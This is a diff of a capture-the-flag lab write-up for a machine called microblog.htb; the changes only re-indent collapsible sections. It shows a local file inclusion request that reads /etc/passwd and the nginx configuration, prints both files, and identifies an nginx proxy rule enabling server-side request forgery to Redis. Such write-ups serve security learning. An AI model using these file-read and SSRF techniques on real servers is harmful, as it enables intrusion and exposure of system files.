@@ -148,41 +148,41 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     ```
     id=/etc/passwd&txt=test
     ```
-    <details>
-    <summary>contents of <code>/etc/passwd</code></summary>
+    - <details>
+        <summary>contents of <code>/etc/passwd</code></summary>
 
-    ```    
-    root:x:0:0:root:/root:/bin/bash
-    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    bin:x:2:2:bin:/bin:/usr/sbin/nologin
-    sys:x:3:3:sys:/dev:/usr/sbin/nologin
-    sync:x:4:65534:sync:/bin:/bin/sync
-    games:x:5:60:games:/usr/games:/usr/sbin/nologin
-    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-    systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-    systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-    systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
-    systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
-    cooper:x:1000:1000::/home/cooper:/bin/bash
-    redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
-    git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
-    messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
-    sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-    _laurel:x:997:997::/var/log/laurel:/bin/false
-    ```
-    </details>
+        ```    
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+        sync:x:4:65534:sync:/bin:/bin/sync
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+        irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+        systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+        systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+        systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+        systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+        cooper:x:1000:1000::/home/cooper:/bin/bash
+        redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
+        git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
+        messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
+        sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+        _laurel:x:997:997::/var/log/laurel:/bin/false
+        ```
+        </details>
 - if we do have write permissions, we can also use this to create new files
 - The code shows that there are additional functions for so-called pro accounts. An additional `/uploads` directory is created for a blog of a pro user account, in which pro users are granted write permissions:
     ```php
@@ -199,113 +199,113 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     }
     ```
 - we can use the LFI vulnerability to retrieve the nginx configuration by setting the `id` parameter to `/etc/nginx/sites-enabled/default`
-    <details>
-    <summary>contents of <code>/etc/nginx/sites-enabled/default</code></summary>
-        
-    ```yaml
-    ##
-    # You should look at the following URL's in order to grasp a solid understanding
-    # of Nginx configuration files in order to fully unleash the power of Nginx.
-    # https://www.nginx.com/resources/wiki/start/
-    # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
-    # https://wiki.debian.org/Nginx/DirectoryStructure
-    #
-    # In most cases, administrators will remove this file from sites-enabled/ and
-    # leave it as reference inside of sites-available where it will continue to be
-    # updated by the nginx packaging team.
-    #
-    # This file will automatically load configuration files provided by other
-    # applications, such as Drupal or Wordpress. These applications will be made
-    # available underneath a path with that package name, such as /drupal8.
-    #
-    # Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
-    ##
-
-    # Default server configuration
-    #
-    server {
-        listen 80 default_server;
-        listen [::]:80 default_server; 
-
-        # SSL configuration 
-        # 
-        # listen 443 ssl default_server; 
-        # listen [::]:443 ssl default_server; 
-        # 
-        # Note: You should disable gzip for SSL traffic. 
-        # See: https://bugs.debian.org/773332 
-        # 
-        # Read up on ssl_ciphers to ensure a secure configuration. 
-        # See: https://bugs.debian.org/765782 
-        # 
-        # Self signed certs generated by the ssl-cert package 
-        # Don't use them in a production server! 
-        # 
-        # include snippets/snakeoil.conf; 
-
-        root /var/www/html;
-
-        # Add index.php to the list if you are using PHP 
-        index index.html index.htm index.nginx-debian.html; 
-        
-        server_name _; 
-        
-        location / { 
-            # First attempt to serve request as file, then 
-            # as directory, then fall back to displaying a 404. 
-            try_files $uri $uri/ =404; 
-        }
-
-        # pass PHP scripts to FastCGI server 
-        # 
-        #location ~ \.php$ { 
-        #   include snippets/fastcgi-php.conf;
+    - <details>
+        <summary>contents of <code>/etc/nginx/sites-enabled/default</code></summary>
+            
+        ```yaml
+        ##
+        # You should look at the following URL's in order to grasp a solid understanding
+        # of Nginx configuration files in order to fully unleash the power of Nginx.
+        # https://www.nginx.com/resources/wiki/start/
+        # https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
+        # https://wiki.debian.org/Nginx/DirectoryStructure
         #
-        #   # With php-fpm (or other unix sockets): 
-        #   fastcgi_pass unix:/run/php/php7.4-fpm.sock;  
-        #   # With php-cgi (or other tcp sockets):
-        #   fastcgi_pass 127.0.0.1:9000; 
-        #} 
-        
-        # deny access to .htaccess files, if Apache's document root 
-        # concurs with nginx's one 
-        # 
-        #location ~ /\.ht { 
-        # deny all; 
-        #}
-    }
+        # In most cases, administrators will remove this file from sites-enabled/ and
+        # leave it as reference inside of sites-available where it will continue to be
+        # updated by the nginx packaging team.
+        #
+        # This file will automatically load configuration files provided by other
+        # applications, such as Drupal or Wordpress. These applications will be made
+        # available underneath a path with that package name, such as /drupal8.
+        #
+        # Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+        ##
 
-    server { 
-        listen 80; 
-        listen [::]:80; 
+        # Default server configuration
+        #
+        server {
+            listen 80 default_server;
+            listen [::]:80 default_server; 
 
-        root /var/www/microblog/app; 
+            # SSL configuration 
+            # 
+            # listen 443 ssl default_server; 
+            # listen [::]:443 ssl default_server; 
+            # 
+            # Note: You should disable gzip for SSL traffic. 
+            # See: https://bugs.debian.org/773332 
+            # 
+            # Read up on ssl_ciphers to ensure a secure configuration. 
+            # See: https://bugs.debian.org/765782 
+            # 
+            # Self signed certs generated by the ssl-cert package 
+            # Don't use them in a production server! 
+            # 
+            # include snippets/snakeoil.conf; 
 
-        index index.html index.htm index-nginx-debian.html; 
-        server_name microblog.htb; 
-        
-        location / { 
-            return 404; 
-        } 
-        
-        location = /static/css/health/ { 
-            resolver 127.0.0.1; 
-            proxy_pass http://css.microbucket.htb/health.txt; 
-        } 
+            root /var/www/html;
 
-        location = /static/js/health/ { 
-            resolver 127.0.0.1; 
-            proxy_pass http://js.microbucket.htb/health.txt; 
-        } 
+            # Add index.php to the list if you are using PHP 
+            index index.html index.htm index.nginx-debian.html; 
+            
+            server_name _; 
+            
+            location / { 
+                # First attempt to serve request as file, then 
+                # as directory, then fall back to displaying a 404. 
+                try_files $uri $uri/ =404; 
+            }
 
-        location ~ /static/(.*)/(.*) { 
-            resolver 127.0.0.1; 
-            proxy_pass http://$1.microbucket.htb/$2; 
+            # pass PHP scripts to FastCGI server 
+            # 
+            #location ~ \.php$ { 
+            #   include snippets/fastcgi-php.conf;
+            #
+            #   # With php-fpm (or other unix sockets): 
+            #   fastcgi_pass unix:/run/php/php7.4-fpm.sock;  
+            #   # With php-cgi (or other tcp sockets):
+            #   fastcgi_pass 127.0.0.1:9000; 
+            #} 
+            
+            # deny access to .htaccess files, if Apache's document root 
+            # concurs with nginx's one 
+            # 
+            #location ~ /\.ht { 
+            # deny all; 
+            #}
         }
-    }
-    ```
 
-    </details>
+        server { 
+            listen 80; 
+            listen [::]:80; 
+
+            root /var/www/microblog/app; 
+
+            index index.html index.htm index-nginx-debian.html; 
+            server_name microblog.htb; 
+            
+            location / { 
+                return 404; 
+            } 
+            
+            location = /static/css/health/ { 
+                resolver 127.0.0.1; 
+                proxy_pass http://css.microbucket.htb/health.txt; 
+            } 
+
+            location = /static/js/health/ { 
+                resolver 127.0.0.1; 
+                proxy_pass http://js.microbucket.htb/health.txt; 
+            } 
+
+            location ~ /static/(.*)/(.*) { 
+                resolver 127.0.0.1; 
+                proxy_pass http://$1.microbucket.htb/$2; 
+            }
+        }
+        ```
+
+        </details>
 - the nginx configuration reveals a misconfiguration, which allows us access the Redis socket through **SSRF (server-side request forgery)**:
     ```yaml
         location ~ /static/(.*)/(.*) { 
